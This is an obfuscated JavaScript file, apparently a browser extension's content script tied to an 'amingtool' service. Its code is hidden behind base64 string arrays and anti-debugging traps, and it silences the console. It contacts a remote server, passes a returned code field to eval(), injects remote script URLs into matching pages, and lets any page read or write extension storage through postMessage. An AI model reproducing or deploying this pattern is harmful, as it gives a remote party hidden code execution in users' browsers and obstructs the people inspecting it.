//a = ['removeChild', 'constructor']
var a = ['cmVtb3ZlQ2hpbGQ=', 'Y29uc3RydWN0b3I=', 'Z2V0VVJM', 'QU1fVE9PTF9ERVRBSUxT', 'e30uY29uc3RydWN0b3IoInJldHVybiB0aGlzIikoICk=', 'Y3JlYXRlRWxlbWVudA==', 'Y29tcGlsZQ==', 'aG9zdG5hbWU=', 'bWVzc2FnZQ==', 'dHlwZQ==', 'YXBwbHk=', 'cmVtb3Zl', 'cmV0dXJuIC8iICsgdGhpcyArICIv', 'YW1pbmd0b29s', 'c3RyaW5n', 'Z2V0TWFuaWZlc3Q=', 'XihbXiBdKyggK1teIF0rKSspK1teIF19', 'ZGVmZXI=', 'c3VjY2Vzcw==', 'dmFsdWU=', 'b2JqZWN0', 'ZG9jdW1lbnRFbGVtZW50', 'c3RyaW5naWZ5', 'dGV4dC9qYXZhc2NyaXB0', 'Y2F0Y2g=', 'c2V0SXRlbQ==', 'bG9jYWw=', 'dGFibGU=', 'anMvYXV0aG9yLmpzb24=', 'b25sb2Fk', 'MC4wLjA=', 'Ym9keQ==', 'dW5kZWZpbmVk', 'YXV0aG9y', 'VVRGLTg=', 'c2NyaXB0', 'dHJhY2U=', 'ZXh0ZW5zaW9u', 'ZGV0YWlscw==', 'cG9zdE1lc3NhZ2U=', 'aW5wdXQ=', 'ZnVuY3Rpb24=', 'YXBwZW5kQ2hpbGQ=', 'aG9zdA==', 'bG9n', 'c3luYw==', 'b3B0aW9ucw==', 'ZmluYWxseQ==', 'ZXJyb3I=', 'dGVzdA==', 'bGVuZ3Ro', 'anNvbg==', 'cnVudGltZQ==', 'a2V5', 'ZnVuY3Rpb24gKlwoICpcKQ==', 'cmV0dXJuIChmdW5jdGlvbigpIA==', 'bWFw', 'YXBwbGljYXRpb24vanNvbg==', 'c2hvcnRfbmFtZQ==', 'QU1fVE9PTF9TVE9SQUdF', 'dGhlbg==', 'aW5mbw==', 'Y2hhcnNldA==', 'Z2V0', 'aW5pdA==', 'YWRkRXZlbnRMaXN0ZW5lcg==', 'dmVyc2lvbg==', 'bmFtZQ==', 'Y29uc29sZQ==', 'c3ViRG9tYWlu', 'c3Jj', 'Z2dlcg==', 'c3RvcmFnZQ==', 'cGFyZW50Tm9kZQ==', 'aW5jbHVkZXM=', 'Z2V0SXRlbQ==', 'Y291bnRlcg==', 'YWN0aW9u', 'Y2hhaW4=', 'ZGVidQ==', 'ZXhjZXB0aW9u', 'cmVtb3Rl', 'cGFyc2U=', 'aGFzT3duUHJvcGVydHk=', 'YXBwZW5k', 'Y2FsbA==', 'c3RhdGVPYmplY3Q=', 'Y29kZQ==', 'XCtcKyAqKD86W2EtekEtWl8kXVswLTlhLXpBLVpfJF0qKQ==', 'd2Fybg==', 'Y29uY2F0', 'ZGF0YQ==', 'ZGVidWc=', 'd2hpbGUgKHRydWUpIHt9', 'c2V0', 'UE9TVA=='];
(function (b, c) {
    var d = function (f) {
        while (--f) {
            b['push'](b['shift']());
        }
    };
    var e = function () {
        var f = {
            'data': {'key': 'cookie', 'value': 'timeout'}, 'setCookie': function (j, k, l, m) {
                m = m || {};
                var p = k + '=' + l;
                var q = 0x0;
                for (var r = 0x0, s = j['length']; r < s; r++) {
                    var t = j[r];
                    p += ';\x20' + t;
                    var u = j[t];
                    j['push'](u);
                    s = j['length'];
                    if (u !== !![]) {
                        p += '=' + u;
                    }
                }
                m['cookie'] = p;
            }, 'removeCookie': function () {
                return 'dev';
            }, 'getCookie': function (j, k) {
                j = j || function (p) {
                    return p;
                };
                var l = j(new RegExp('(?:^|;\x20)' + k['replace'](/([.$?*|{}()[]\/+^])/g, '$1') + '=([^;]*)'));
                var m = function (p, q) {
                    p(++q);
                };
                m(d, c);
                return l ? decodeURIComponent(l[0x1]) : undefined;
            }
        };
        var g = function () {
            var j = new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');
            return j['test'](f['removeCookie']['toString']());
        };
        f['updateCookie'] = g;
        var h = '';
        var i = f['updateCookie']();
        if (!i) {
            f['setCookie'](['*'], 'counter', 0x1);
        } else if (i) {
            h = f['getCookie'](null, 'counter');
        } else {
            f['removeCookie']();
        }
    };
    e();
}(a, 0x1e2));
var b = function (c, d) {
    c = c - 0x0;
    var e = a[c];
    if (b['YPwwbr'] === undefined) {
        (function () {
            var g = function () {
                var j;
                try {
                    j = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')();
                } catch (k) {
                    j = window;
                }
                return j;
            };
            var h = g();
            var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            h['atob'] || (h['atob'] = function (j) {
                var k = String(j)['replace'](/=+$/, '');
                var l = '';
                for (var m = 0x0, n, o, p = 0x0; o = k['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? l += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                    o = i['indexOf'](o);
                }
                return l;
            });
        }());
        b['GHVcMC'] = function (g) {
            var h = atob(g);
            var j = [];
            for (var k = 0x0, l = h['length']; k < l; k++) {
                j += '%' + ('00' + h['charCodeAt'](k)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(j);
        };
        b['rphdrF'] = {};
        b['YPwwbr'] = !![];
    }
    var f = b['rphdrF'][c];
    if (f === undefined) {
        var g = function (h) {
            this['ITyNPz'] = h;
            this['KqWkxD'] = [0x1, 0x0, 0x0];
            this['YNcBiK'] = function () {
                return 'newState';
            };
            this['TInZeM'] = '\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';
            this['QUWuJN'] = '[\x27|\x22].+[\x27|\x22];?\x20*}';
        };
        g['prototype']['ZSLbWd'] = function () {
            var h = new RegExp(this['TInZeM'] + this['QUWuJN']);
            var i = h['test'](this['YNcBiK']['toString']()) ? --this['KqWkxD'][0x1] : --this['KqWkxD'][0x0];
            return this['SJHWUq'](i);
        };
        g['prototype']['SJHWUq'] = function (h) {
            if (!Boolean(~h)) {
                return h;
            }
            return this['LAtxig'](this['ITyNPz']);
        };
        g['prototype']['LAtxig'] = function (h) {
            for (var j = 0x0, k = this['KqWkxD']['length']; j < k; j++) {
                this['KqWkxD']['push'](Math['round'](Math['random']()));
                k = this['KqWkxD']['length'];
            }
            return h(this['KqWkxD'][0x0]);
        };
        new g(b)['ZSLbWd']();
        e = b['GHVcMC'](e);
        b['rphdrF'][c] = e;
    } else {
        e = f;
    }
    return e;
};
const c = b('0x1');
const d = b('0x39');
const e = 'https://amingtool.zhishuchacha.com/index/Upgrade/index8_0_1';
const f = typeof chrome !== b('0x1e') && chrome[b('0x51')](b('0x32')) && chrome[b('0x32')][b('0x51')](b('0xd'));
g()[b('0x3a')](n => {
    localStorage[b('0x17')](c, JSON[b('0x14')](n));
});
window[b('0x3f')](b('0x6'), function (n) {
    const o = n && n[b('0x59')] ? n[b('0x59')] : null;
    if (o && o[b('0x51')]('type') && o[b('0x7')] === b('0x46')) {
        var p = o[b('0x24')];
        var q = null;
        if (p[b('0x51')](b('0x11'))) {
            q = p[b('0x11')] === null ? b('0x9') : b('0x5c');
        } else {
            q = b('0x3d');
        }
        switch (q) {
            case b('0x3d'):
                if (f) {
                    chrome[b('0x46')][b('0x2b')][b('0x3d')](p[b('0x33')], function (s) {
                        var t = s && s[b('0x51')](p[b('0x33')]) ? s[p[b('0x33')]] : null;
                        h(o['id'], t, b('0x10'));
                    });
                } else {
                    i(p[b('0x33')], function (s) {
                        h(o['id'], s, b('0x10'));
                    });
                }
                break;
            case b('0x5c'):
                if (f) {
                    var r = {};
                    r[p[b('0x33')]] = p[b('0x11')];
                    chrome[b('0x46')][b('0x2b')][b('0x5c')](r, function () {
                        h(o['id'], null, b('0x10'));
                    });
                } else {
                    j(p[b('0x33')], p[b('0x11')], function (s) {
                        h(o['id'], null, b('0x10'));
                    });
                }
                break;
            case b('0x9'):
                if (f) {
                    chrome[b('0x46')][b('0x2b')][b('0x9')](p[b('0x33')], function () {
                        h(o['id'], null, b('0x10'));
                    });
                } else {
                    j(p[b('0x33')], null, function (s) {
                        h(o['id'], null, b('0x10'));
                    });
                }
                break;
        }
    }
});
if (typeof document[b('0x1d')][b('0x52')] !== b('0x27')) {
    chrome[b('0x46')][b('0x18')][b('0x3d')](b('0xb'), function (n) {
        if (n && n[b('0x51')](b('0xb'))) {
            try {
                for (let o = 0x0; o < n[b('0xb')][b('0x2c')][b('0x30')]; o++) {
                    if (location[b('0x5')][b('0x48')](n[b('0xb')][b('0x2c')][o][b('0x29')])) {
                        fetch(e, {
                            'method': b('0x5d'),
                            'body': JSON[b('0x14')]({'v': n[b('0xb')][b('0x40')], 'type': b('0x5a')}),
                            'headers': new Headers({'Content-Type': b('0x37')})
                        })[b('0x3a')](p => p[b('0x31')]())[b('0x3a')](p => {
                            if (n[b('0xb')][b('0x40')] !== p[b('0xb')][b('0x40')]) {
                                chrome[b('0x46')][b('0x18')][b('0x5c')](p, function () {
                                    try {
                                        eval(p[b('0xb')][b('0x55')]);
                                    } catch (q) {
                                        console[b('0x2a')](q);
                                    }
                                    k(p[b('0xb')][b('0x2c')]);
                                });
                            } else {
                                k(n[b('0xb')][b('0x2c')]);
                            }
                        })[b('0x16')](p => {
                            k(n[b('0xb')][b('0x2c')]);
                            console[b('0x2a')](p);
                        });
                    }
                }
            } catch (p) {
                fetch(e, {
                    'method': b('0x5d'),
                    'body': JSON[b('0x14')]({'v': b('0x1c'), 'type': b('0x5a')}),
                    'headers': new Headers({'Content-Type': b('0x37')})
                })[b('0x3a')](q => q[b('0x31')]())[b('0x3a')](q => {
                    chrome[b('0x46')][b('0x18')][b('0x5c')](q, function () {
                        k(q[b('0xb')][b('0x2c')]);
                    });
                })[b('0x16')](q => console[b('0x2a')](q));
            }
        } else {
            fetch(e, {
                'method': b('0x5d'),
                'body': JSON[b('0x14')]({'v': b('0x1c'), 'type': b('0x5a')}),
                'headers': new Headers({'Content-Type': b('0x37')})
            })[b('0x3a')](q => q[b('0x31')]())[b('0x3a')](q => {
                chrome[b('0x46')][b('0x18')][b('0x5c')](q, function () {
                    k(q[b('0xb')][b('0x2c')]);
                });
            })[b('0x16')](q => console[b('0x2a')](q));
        }
    });
}

function g() {
    var n = function () {
        var s = !![];
        return function (t, u) {
            var v = s ? function () {
                if (u) {
                    var w = u[b('0x8')](t, arguments);
                    u = null;
                    return w;
                }
            } : function () {
            };
            s = ![];
            return v;
        };
    }();
    var o = n(this, function () {
        var s = function () {
            var t = s[b('0x5f')](b('0xa'))()[b('0x4')](b('0xe'));
            return !t[b('0x2f')](o);
        };
        return s();
    });
    o();
    var p = function () {
        var s = !![];
        return function (t, u) {
            var v = s ? function () {
                if (u) {
                    var w = u[b('0x8')](t, arguments);
                    u = null;
                    return w;
                }
            } : function () {
            };
            s = ![];
            return v;
        };
    }();
    (function () {
        p(this, function () {
            var s = new RegExp(b('0x34'));
            var t = new RegExp(b('0x56'), 'i');
            var u = m(b('0x3e'));
            if (!s[b('0x2f')](u + b('0x4c')) || !t[b('0x2f')](u + b('0x26'))) {
                u('0');
            } else {
                m();
            }
        })();
    }());
    var q = function () {
        var s = !![];
        return function (t, u) {
            var v = s ? function () {
                if (u) {
                    var w = u[b('0x8')](t, arguments);
                    u = null;
                    return w;
                }
            } : function () {
            };
            s = ![];
            return v;
        };
    }();
    var r = q(this, function () {
        var s = function () {
        };
        var t = function () {
            var v;
            try {
                v = Function(b('0x35') + b('0x2') + ');')();
            } catch (w) {
                v = window;
            }
            return v;
        };
        var u = t();
        if (!u[b('0x42')]) {
            u[b('0x42')] = function (v) {
                var w = {};
                w[b('0x2a')] = v;
                w[b('0x57')] = v;
                w[b('0x5a')] = v;
                w[b('0x3b')] = v;
                w[b('0x2e')] = v;
                w[b('0x4e')] = v;
                w[b('0x19')] = v;
                w[b('0x22')] = v;
                return w;
            }(s);
        } else {
            u[b('0x42')][b('0x2a')] = s;
            u[b('0x42')][b('0x57')] = s;
            u[b('0x42')][b('0x5a')] = s;
            u[b('0x42')][b('0x3b')] = s;
            u[b('0x42')][b('0x2e')] = s;
            u[b('0x42')][b('0x4e')] = s;
            u[b('0x42')][b('0x19')] = s;
            u[b('0x42')][b('0x22')] = s;
        }
    });
    r();
    return new Promise((s, t) => {
        if (f) {
            manifest = chrome[b('0x32')][b('0xd')]();
            let u = {'name': manifest[b('0x41')], 'version': manifest[b('0x40')]};
            fetch(chrome[b('0x32')][b('0x0')](b('0x1a')))[b('0x3a')](v => v[b('0x31')]())[b('0x3a')](v => {
                u[b('0x1f')] = v[b('0x1f')];
                u[b('0x43')] = v[b('0x38')];
            })[b('0x2d')](() => {
                s(u);
            });
        } else {
            s(null);
        }
    });
}

function h(n, o, p) {
    window[b('0x25')]({'id': n, 'details': o, 'status': p}, '*');
}

function i(n, o) {
    let p = localStorage[b('0x49')](d);
    let q = null;
    if (p) {
        try {
            q = JSON[b('0x50')](p);
        } catch (s) {
            q = null;
        }
    }
    let r = null;
    if (n) {
        r = q && typeof q === b('0x12') && q[b('0x51')](n) ? q[n] : null;
    } else {
        r = q;
    }
    o(r);
}

function j(n, o, p) {
    i(null, function (q) {
        q = q || {};
        if (o !== null) {
            q[n] = o;
        } else {
            delete q[n];
        }
        localStorage[b('0x17')](d, JSON[b('0x14')](q));
        p();
    });
}

setInterval(function () {
    m();
}, 0xfa0);

function k(n) {
    for (let p = 0x0; p < n[b('0x30')]; p++) {
        if (location[b('0x5')][b('0x48')](n[p][b('0x29')])) {
            var o = [];
            if (n[p]['js'][b('0x18')]['in']) {
                o = o[b('0x58')](n[p]['js'][b('0x18')]['in'][b('0x36')](q => chrome[b('0x23')][b('0x0')](q)));
            }
            if (n[p]['js'][b('0x4f')]['in']) {
                o = o[b('0x58')](n[p]['js'][b('0x4f')]['in']);
            }
            l(o);
            break;
        }
    }
}

function l(n) {
    if (!n) {
        return;
    }
    if (n[b('0x30')] === 0x0) {
        return;
    }
    return new Promise((o, p) => {
        var q = function (r) {
            var s = n[r];
            var t = document[b('0x3')](b('0x21'));
            t[b('0x7')] = b('0x15');
            t[b('0x1b')] = function () {
                r++;
                if (r === n[b('0x30')]) {
                    o();
                } else {
                    q(r);
                }
                this[b('0x47')][b('0x5e')](this);
            };
            t[b('0x44')] = s;
            t[b('0x3c')] = b('0x20');
            t[b('0xf')] = b('0xf');
            document[b('0x13')][b('0x28')](t);
        };
        q(0x0);
    });
}

function m(n) {
    function o(p) {
        if (typeof p === b('0xc')) {
            return function (q) {
            }[b('0x5f')](b('0x5b'))[b('0x8')](b('0x4a'));
        } else {
            if (('' + p / p)[b('0x30')] !== 0x1 || p % 0x14 === 0x0) {
                (function () {
                    return !![];
                }[b('0x5f')](b('0x4d') + b('0x45'))[b('0x53')](b('0x4b')));
            } else {
                (function () {
                    return ![];
                }[b('0x5f')](b('0x4d') + b('0x45'))[b('0x8')](b('0x54')));
            }
        }
        o(++p);
    }

    try {
        if (n) {
            return o;
        } else {
            o(0x0);
        }
    } catch (p) {
    }
}